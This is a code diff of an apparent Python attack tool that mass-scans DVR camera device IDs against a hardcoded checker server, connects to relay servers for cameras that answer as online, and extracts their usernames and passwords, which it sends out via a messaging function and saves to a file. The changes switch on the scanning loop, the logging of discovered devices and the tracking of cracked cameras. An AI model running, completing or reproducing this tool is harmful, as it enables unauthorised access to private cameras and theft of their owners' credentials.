@@ -14,7 +14,7 @@ class server:
     SCAN_NEW_CAMS = True
     FROM_ID = 10000000
     TO_ID = 99999999
-    TIMEOUT = 60
+    TIMEOUT = 30
     PACK_LIST_CAMS = 9999999  # SIZE CAMS FOR 1 THREAD LISTEN
     THREAD_CHECK = 300
     SERVER_CHECKER = '47.74.66.18'
@@ -46,13 +46,13 @@ class server:
                 else:
                     self.RemoveDuplicate()
                     self.CamList(self.FileListCams)
-                # if not bool(self.CamsList):
-                #     break
-                # cams = list(self.func_chunk(self.CamsList, self.PACK_LIST_CAMS))
-                #
-                # for cam in cams:
-                #     self.Multiprocessing(cam)
-                #     time.sleep(1)
+                    if not bool(self.CamsList):
+                        break
+                    cams = list(self.func_chunk(self.CamsList, self.PACK_LIST_CAMS))
+
+                    for cam in cams:
+                        self.Multiprocessing(cam)
+                        time.sleep(1)
 
         except socket.error as e:
             print("socket creation failed with error %s\nuse Pt"
@@ -105,14 +105,15 @@ class server:
         for i in list_ids:
             if i:
                 try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     # print(f'\u001b[35m[+] Check ID: {i}\u001b[37m')
                     hexID = bytes(str(i), 'utf-8').hex()
                     data = 'ac000000f3030000'
                     data += hexID
                     data += '2e6e766476722e6e657400000000000000000000000000006022000093f5d10000000000000000000000000000000000'
                     data = bytes.fromhex(data)
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.connect((self.SERVER_CHECKER, self.PORT_CHECKER))
+                    time.sleep(1)  # ToDo
                     sock.send(data)
                     response = sock.recv(4096)
                     sock.close()
@@ -120,12 +121,14 @@ class server:
                         if response[4] == 1:
                             # print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
                             # Append-adds at last
-                            # with open(self.FileListCams, "a") as f:
-                            #     f.write(f"{i}\n")
+                            with open(self.FileListCams, "a") as f:
+                                f.write(f"{i}\n")
 
                             process = multiprocessing.Process(target=self.CreateSocket, args=(i,))
                             process.start()
                             process.join()
+                            time.sleep(1)  # ToDo
+
                     except IndexError:
                         pass
 
@@ -170,8 +173,8 @@ class server:
                 self.send_msg(f'[+] DeviceID:{d["id"]}'
                               f'[+] Username: {username}'
                               f'[+] Password: {password}')
-                # self.CamsList.remove(d["id"])
-                # self.SaveCams(self.CamsList)
+                self.CamsList.remove(d["id"])
+                self.SaveCams(self.CamsList)
                 with open(self.PassFile, "a") as f:
                     f.write(f"{d['id']}:{str(username)}:{str(password)}\n")
                 relay_s.close()
@@ -208,6 +211,7 @@ class server:
     def CreateSocket(self, dev):
         try:
             if dev:
+                time.sleep(1)  # ToDo
                 check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 check_s.settimeout(self.TIMEOUT)
                 if self.DEBUG:
@@ -221,16 +225,11 @@ class server:
                 self.send_data(check_s, data, self.SERVER, self.PORT)
                 # print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
                 result = (check_s.recvfrom(4096, 0))[0]
-                if result[6:7] != b'\x00':
-                    result = self.ParseRelayServer(result)
-                    if result:
-                        self.ConnectToRelay(result)
-                else:
-                    self.send_data(check_s, data, self.SERVER, self.PORT)
-                    result = (check_s.recvfrom(4096, 0))[0]
-                    result = self.ParseRelayServer(result)
-                    if result:
-                        self.ConnectToRelay(result)
+                print(result[6:7])
+                # if result[6:7] != b'\x00':
+                result = self.ParseRelayServer(result)
+                if result:
+                    self.ConnectToRelay(result)
                 check_s.close()
         except timeout:
             pass
